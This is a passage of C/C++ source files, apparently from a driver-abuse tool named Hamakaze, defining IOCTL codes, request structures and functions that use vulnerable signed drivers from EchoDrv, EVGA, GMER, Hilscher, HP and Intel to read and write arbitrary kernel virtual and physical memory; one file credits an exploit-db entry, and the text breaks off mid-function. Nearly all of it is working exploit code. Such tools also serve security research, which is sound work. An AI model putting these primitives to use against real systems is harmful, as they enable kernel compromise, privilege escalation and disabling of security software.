#define IOCTL_ECHODRV_OPEN_PROCESS      \
    CTL_CODE(ECHODRV_INTERFACE_TYPE_1, ECHODRV_FUNCTION_OPEN_PROCESS, METHOD_BUFFERED, FILE_READ_ACCESS) //0xE6224248

#define IOCTL_ECHODRV_COPYVM            \
    CTL_CODE(ECHODRV_INTERFACE_TYPE_2, ECHODRV_FUNCTION_COPYVM, METHOD_BUFFERED, FILE_READ_ACCESS) //0x60A26124

typedef struct _ECHODRV_REGISTER {
    _In_ PUCHAR pvSignature;
    _In_ SIZE_T cbSignature;
    _Out_ BOOL bSuccess;
    _Out_ DWORD UniqCode; //0x1000 for call
} ECHODRV_REGISTER, * PECHODRV_REGISTER;

typedef struct _ECHODRV_OPENPROCESS_REQUEST {
    _In_ DWORD ProcessId;
    _In_ ACCESS_MASK DesiredAccess;
    _Out_ HANDLE ProcessHandle;
    _Out_ BOOL bSuccess;
    _Out_ DWORD UniqCode; //0x1001 for call
} ECHODRV_OPENPROCESS_REQUEST, * PECHODRV_OPENPROCESS_REQUEST;

typedef struct _ECHODRV_COPYVM_REQUEST {
    _In_ HANDLE ProcessHandle;
    _In_ PVOID FromAddress;
    _In_ PVOID ToAddress;
    _In_ SIZE_T BufferSize;
    _Out_ SIZE_T NumberOfBytesCopied;
    _Out_ BOOL bSuccess;
    _Out_ DWORD UniqCode; //0x1002 for call
} ECHODRV_COPYVM_REQUEST, * PECHODRV_COPY_REQUEST;

BOOL WINAPI EchoDrvRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI EchoDrvUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI EchoDrvReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI EchoDrvWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI EchoDrvOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

```

`Source/Hamakaze/idrv/evga.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       EVGA.CPP
*
*  VERSION:     1.41
*
*  DATE:        10 Dec 2023
*
*  EVGA driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/evga.h"

/*
* 
*  WARNING: Bruteforce can take a lot of time because ELEETX1 driver does a lot of debug prints.
* 
*/

/*
* EvgaReadPhysicalMemory
*
* Purpose:
*
* Read physical memory through MmMapIoSpace.
* Input buffer length must be aligned to ULONG_PTR
*
*/
BOOL WINAPI EvgaReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    if ((NumberOfBytes % sizeof(ULONG_PTR)) != 0)
        return FALSE;

    PULONG_PTR BufferPtr = (PULONG_PTR)Buffer;

    ULONG_PTR address = PhysicalAddress;
    ULONG_PTR valueRead, readBytes = 0;

    for (ULONG_PTR i = 0; i < NumberOfBytes / sizeof(ULONG_PTR); i++) {

        valueRead = 0;

        if (!supCallDriver(DeviceHandle,
            IOCTL_EVGA_ELEETX1_READ_PHYSMEM,
            &address,
            sizeof(address),
            &valueRead,
            sizeof(valueRead)))
        {
            break;
        }

        BufferPtr[i] = valueRead;
        address += sizeof(ULONG_PTR);
        readBytes += sizeof(ULONG_PTR);
    }

    return (readBytes == NumberOfBytes);

}

/*
* EvgaWritePhysicalMemory
*
* Purpose:
*
* Write physical memory through MmMapIoSpace.
*
*/
_Success_(return != FALSE)
BOOL WINAPI EvgaWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    EVGA_ELEETX1_WRITE_REQUEST request;

    PBYTE BufferPtr = (PBYTE)Buffer;

    ULONG_PTR address = PhysicalAddress;
    ULONG writeBytes = 0;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        request.Value = BufferPtr[i];
        request.Address.QuadPart = address;

        if (!supCallDriver(DeviceHandle,
            IOCTL_EVGA_ELEETX1_WRITE_PHYSMEM,
            &request,
            sizeof(request),
            NULL,
            0))
        {
            break;
        }

        address += sizeof(BYTE);
        writeBytes += sizeof(BYTE);
    }

    return (writeBytes == NumberOfBytes);
}

```

`Source/Hamakaze/idrv/evga.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       EVGA.H
*
*  VERSION:     1.41
*
*  DATE:        10 Dec 2023
*
*  EVGA driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// EVGA ELEETX1 driver interface.
//

#define EVGA_ELEETX1_DEVICE_TYPE   (DWORD)0x8000

#define EVGA_ELEETX1_FUNCTION_READPHYSMEM 0x905
#define EVGA_ELEETX1_FUNCTION_WRITEPHYSMEM 0x906

#define IOCTL_EVGA_ELEETX1_READ_PHYSMEM    \
    CTL_CODE(EVGA_ELEETX1_DEVICE_TYPE, EVGA_ELEETX1_FUNCTION_READPHYSMEM, METHOD_BUFFERED, FILE_READ_ACCESS) //0x80006414

#define IOCTL_EVGA_ELEETX1_WRITE_PHYSMEM    \
    CTL_CODE(EVGA_ELEETX1_DEVICE_TYPE, EVGA_ELEETX1_FUNCTION_WRITEPHYSMEM, METHOD_BUFFERED, FILE_READ_ACCESS) //0x80006418

//Where-what
typedef struct _EVGA_ELEETX1_WRITE_REQUEST {
    PHYSICAL_ADDRESS Address; //Where
    ULONG64 Value; //What 1, 2, 4, 8 size
} EVGA_ELEETX1_WRITE_REQUEST, * PEVGA_ELEETX1_WRITE_REQUEST;

BOOL WINAPI EvgaReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI EvgaWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/gmer.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       GMER.CPP
*
*  VERSION:     1.31
*
*  DATE:        14 Apr 2023
*
*  GMER driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/gmer.h"

/*
* GmerRegisterDriver
*
* Purpose:
*
* Driver initialization routine.
*
*/
BOOL WINAPI GmerRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    BOOL bResult;
    ULONG ulRegistration = 0;

    bResult = supCallDriver(DeviceHandle,
        IOCTL_GMER_REGISTER_CLIENT,
        &ulRegistration,
        sizeof(ULONG),
        &ulRegistration,
        sizeof(ULONG));

    return bResult && (ulRegistration == 1);
}

/*
* GmerReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Gmer.
*
*/
BOOL WINAPI GmerReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    GMER_READ_REQUEST request;

    request.VirtualAddress = VirtualAddress;

    return supCallDriver(DeviceHandle,
        IOCTL_GMER_READVM,
        &request,
        sizeof(GMER_READ_REQUEST),
        Buffer,
        NumberOfBytes);

}

/*
* GmerWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Gmer.
*
*/
BOOL WINAPI GmerWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;

    GMER_WRITE_REQUEST* pRequest;

    value = FIELD_OFFSET(GMER_WRITE_REQUEST, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (GMER_WRITE_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->Unused = 0;
        pRequest->VirtualAddress = VirtualAddress;
        pRequest->DataSize = NumberOfBytes;
        RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_GMER_WRITEVM,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        if (!bResult)
            dwError = GetLastError();

        supFreeLockedMemory(pRequest, size);
    }

    SetLastError(dwError);
    return bResult;
}

```

`Source/Hamakaze/idrv/gmer.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       GMER.H
*
*  VERSION:     1.20
*
*  DATE:        08 Feb 2022
*
*  GMER driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once


//
// Gmer driver interface.
//

#define GMER_DEVICE_TYPE   (DWORD)0x7201
#define GMER_DEVICE_TYPE_2 (DWORD)0x9876

#define GMER_FUNCTION_READVM 0xA
#define GMER_FUNCTION_WRITEVM 0xD
#define GMER_FUNCTION_REGISTER_CLIENT 0x1

#define IOCTL_GMER_REGISTER_CLIENT    \
    CTL_CODE(GMER_DEVICE_TYPE_2, GMER_FUNCTION_REGISTER_CLIENT, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) //0x9876C004

#define IOCTL_GMER_READVM    \
    CTL_CODE(GMER_DEVICE_TYPE, GMER_FUNCTION_READVM, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) //0x7201C028

#define IOCTL_GMER_WRITEVM    \
    CTL_CODE(GMER_DEVICE_TYPE, GMER_FUNCTION_WRITEVM, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) //0x7201C034

typedef struct _GMER_READ_REQUEST {
    ULONG_PTR VirtualAddress;
} GMER_READ_REQUEST, * PGMER_READ_REQUEST;

typedef struct _GMER_WRITE_REQUEST {
    ULONG_PTR Unused;
    ULONG_PTR VirtualAddress;
    ULONG DataSize;
    UCHAR Data[1];
} GMER_WRITE_REQUEST, * PGMER_WRITE_REQUEST;

BOOL WINAPI GmerRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI GmerReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI GmerWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/hilscher.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       HILSCHER.CPP
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Hilscher physmem driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/hilscher.h"

/*
* PhmpReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write from physical memory.
*
*/
BOOL WINAPI PhmpReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite)
{
    DWORD bytesIO = 0;
    BOOL bResult;
    NTSTATUS ntStatus;
    PHYSMEM_MAP_IN request;

    request.ullPhysicalAddress = PhysicalAddress;
    request.ulMapSize = NumberOfBytes;

    ntStatus = supCallDriverEx(DeviceHandle,
        IOCTL_PHYSMEM_MAP,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        NULL);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    SetFilePointer(DeviceHandle, 0, NULL, FILE_BEGIN);

    if (DoWrite)
        bResult = WriteFile(DeviceHandle, Buffer, NumberOfBytes, &bytesIO, NULL);
    else
        bResult = ReadFile(DeviceHandle, Buffer, NumberOfBytes, &bytesIO, NULL);

    return bResult;
}

/*
* PhmReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI PhmReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PhmpReadWritePhysicalMemory(DeviceHandle, PhysicalAddress, Buffer, NumberOfBytes, FALSE);
}

/*
* PhmWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI PhmWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PhmpReadWritePhysicalMemory(DeviceHandle, PhysicalAddress, Buffer, NumberOfBytes, TRUE);
}

/*
* PhmRegisterDriver
*
* Purpose:
*
* Set physmem access type.
*
*/
BOOL WINAPI PhmRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    PHYSMEM_ACCESS_IN request;

    request.ulAccessType = PHYSMEM_READWRITE_ACCESS_8BIT;

    return supCallDriver(DeviceHandle, IOCTL_PHYSMEM_SETACCESS, &request, sizeof(request), NULL, 0);
}

```

`Source/Hamakaze/idrv/hilscher.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       HILSCHER.H
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  HILSCHER physmem driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define PHYSMEM_READWRITE_ACCESS_8BIT   1 //byte 
#define PHYSMEM_READWRITE_ACCESS_16BIT  2 //word
#define PHYSMEM_READWRITE_ACCESS_32BIT  3 //dword
#define PHYSMEM_READWRITE_ACCESS_64BIT  4 //qword
#define PHYSMEM_READWRITE_ACCESS_MEMCPY 5 //memcpy

#define	FILE_DEVICE_HILSCHER   FILE_DEVICE_UNKNOWN

#define PHYSMEM_MAP             (DWORD)0x900
#define PHYSMEM_SETACCESS       (DWORD)0x901

#define IOCTL_PHYSMEM_MAP     \
    CTL_CODE(FILE_DEVICE_HILSCHER, PHYSMEM_MAP,\
             METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_PHYSMEM_SETACCESS   \
    CTL_CODE(FILE_DEVICE_HILSCHER, PHYSMEM_SETACCESS,\
             METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

//
// Hilscher HW driver interface.
//

typedef struct _PHYSMEM_ACCESS_IN {
    ULONG ulAccessType;
} PHYSMEM_ACCESS_IN, * PPHYSMEM_ACCESS_IN;

typedef struct _PHYSMEM_MAP_IN {
    ULONGLONG ullPhysicalAddress;
    ULONG ulMapSize;
} PHYSMEM_MAP_IN, * PPHYSMEM_MAP_IN;

BOOL WINAPI PhmReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PhmWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PhmRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

```

`Source/Hamakaze/idrv/hp.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       HP.CPP
*
*  VERSION:     1.32
*
*  DATE:        20 May 2022
*
*  Hewlett Packard driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/hp.h"

/*
* HpEtdReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via HP ETD driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI HpEtdReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PBYTE BufferPtr = (PBYTE)Buffer;
    ULONG_PTR virtAddress = VirtualAddress;
    ULONG readBytes = 0;
    HP_VMEM_REQUEST request;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        RtlSecureZeroMemory(&request, sizeof(request));

        request.Source = virtAddress;
        request.Granularity = HpByte;

        if (!supCallDriver(DeviceHandle, IOCTL_HP_READ_VMEM,
            &request, sizeof(request),
            &request, sizeof(request)))
        {
            break;
        }

        BufferPtr[i] = request.InputOutput.ValueByType.vtByte;
        virtAddress += sizeof(BYTE);
        readBytes += sizeof(BYTE);
    }

    return (readBytes == NumberOfBytes);
}

/*
* HpEtdWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via HP ETD driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI HpEtdWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    PBYTE BufferPtr = (PBYTE)Buffer;

    ULONG_PTR virtAddress = VirtualAddress;
    ULONG writeBytes = 0;
    HP_VMEM_REQUEST request;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        RtlSecureZeroMemory(&request, sizeof(request));

        request.Source = virtAddress;
        request.Granularity = HpByte;
        request.InputOutput.ValueByType.vtByte = BufferPtr[i];

        if (!supCallDriver(DeviceHandle, IOCTL_HP_WRITE_VMEM,
            &request, sizeof(request),
            NULL, 0))
        {
            break;
        }

        virtAddress += sizeof(BYTE);
        writeBytes += sizeof(BYTE);
    }

    return (writeBytes == NumberOfBytes);
}

```

`Source/Hamakaze/idrv/hp.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       HP.H
*
*  VERSION:     1.32
*
*  DATE:        20 May 2023
*
*  Hewlett Packard driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Hewlett Packard interface for ETDi Service Driver.
//

#define HP_DEVICE_TYPE        (DWORD)0x8000

#define HP_READ_VMEM  (DWORD)0x80F
#define HP_WRITE_VMEM (DWORD)0x80E 

#define IOCTL_HP_READ_VMEM        \
    CTL_CODE(HP_DEVICE_TYPE, HP_READ_VMEM, METHOD_BUFFERED, FILE_READ_ACCESS) //0x8000603C

#define IOCTL_HP_WRITE_VMEM       \
    CTL_CODE(HP_DEVICE_TYPE, HP_WRITE_VMEM, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0x80006038

typedef enum _HP_VALUE_GRANULARITY {
    HpByte = 1,
    HpWord = 2,
    HpDword = 4
} HP_VALUE_GRANULARITY;

typedef struct _HP_VMEM_REQUEST { //sizeof 32
    HP_VALUE_GRANULARITY Granularity;
    ULONG Spare0;
    ULONG_PTR Unused0;
    ULONG_PTR Source;
    union {
        union {
            BYTE vtByte;
            WORD vtWord;
            DWORD vtDword;
        } ValueByType;
        DWORD Value;
    } InputOutput;
    ULONG Spare1;
} HP_VMEM_REQUEST, * PHP_VMEM_REQUEST;

_Success_(return != FALSE)
BOOL WINAPI HpEtdReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI HpEtdWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/intel.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2024
*
*  TITLE:       INTEL.CPP
*
*  VERSION:     1.42
*
*  DATE:        01 Apr 2024
*
*  Intel drivers routines.
*
*    Network Adapter iQVM64 driver aka Nal
*    Intel(R) Management Engine Tools Driver aka PmxDrv
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/intel.h"

//
// Based on https://www.exploit-db.com/exploits/36392
//

/*
* NalCallDriver
*
* Purpose:
*
* Call Intel Nal driver.
*
*/
BOOL NalCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Buffer,
    _In_ ULONG Size)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IOCTL_NAL_MANAGE,
        Buffer,
        Size,
        NULL,
        0);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* NalMapAddressEx
*
* Purpose:
*
* Call MmMapIoSpace via Nal driver, return kernel mode virtual address.
*
*/
BOOL NalMapAddressEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_ ULONG_PTR* VirtualAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    NAL_MAP_IO_SPACE request;

    if (VirtualAddress)
        *VirtualAddress = 0;
    else
        return FALSE;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_MAPIOSPACE;
    request.PhysicalAddress = PhysicalAddress;
    request.NumberOfBytes = NumberOfBytes;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        if (request.OpResult == 0) {
            *VirtualAddress = request.VirtualAddress;
            bResult = TRUE;
        }
        else {
            SetLastError(ERROR_INTERNAL_ERROR);
        }
    }

    return bResult;
}

/*
* NalUnmapAddress
*
* Purpose:
*
* Call MmUnmapIoSpace via Nal driver.
*
*/
BOOL NalUnmapAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    NAL_UNMAP_IO_SPACE request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_UNMAPIOSPACE;
    request.VirtualAddress = VirtualAddress;
    request.NumberOfBytes = NumberOfBytes;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        bResult = (request.OpResult == 0);
        if (bResult == FALSE) {
            SetLastError(ERROR_NONE_MAPPED);
        }
    }

    return bResult;
}

/*
* NalVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
* N.B.
* Call driver Intel Nal driver MmGetVirtualForPhysical switch case.
*
*/
BOOL WINAPI NalVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;
    NAL_GET_PHYSICAL_ADDRESS request;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_VIRTUALTOPHYSCAL;
    request.VirtualAddress = VirtualAddress;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        *PhysicalAddress = request.PhysicalAddress;
        bResult = TRUE;
    }

    return bResult;
}

/*
* NalReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Nal memmove switch case.
*
*/
_Success_(return != FALSE)
BOOL NalReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;

    PVOID lockedBuffer = (PVOID)supAllocateLockedMemory(NumberOfBytes,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (lockedBuffer) {

        RtlSecureZeroMemory(&request, sizeof(request));
        request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
        request.SourceAddress = VirtualAddress;
        request.DestinationAddress = (ULONG_PTR)lockedBuffer;
        request.Length = NumberOfBytes;

        bResult = NalCallDriver(DeviceHandle, &request, sizeof(request));
        if (bResult) {
            RtlCopyMemory(Buffer, lockedBuffer, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

        supFreeLockedMemory(lockedBuffer, NumberOfBytes);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* NalWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Nal memmove switch case.
*
*/
_Success_(return != FALSE)
BOOL NalWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;

    PVOID lockedBuffer = (PVOID)supAllocateLockedMemory(NumberOfBytes,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (lockedBuffer) {

        RtlCopyMemory(lockedBuffer, Buffer, NumberOfBytes);

        RtlSecureZeroMemory(&request, sizeof(request));
        request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
        request.SourceAddress = (ULONG_PTR)lockedBuffer;
        request.DestinationAddress = VirtualAddress;
        request.Length = NumberOfBytes;

        bResult = NalCallDriver(DeviceHandle, &request, sizeof(request));
        if (bResult == FALSE) {
            dwError = GetLastError();
        }

        supFreeLockedMemory(lockedBuffer, NumberOfBytes);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* NalWriteVirtualMemory
*
* Purpose:
*
* Write to virtual memory via mapping.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NalWriteVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR physAddress, mappedVirt;

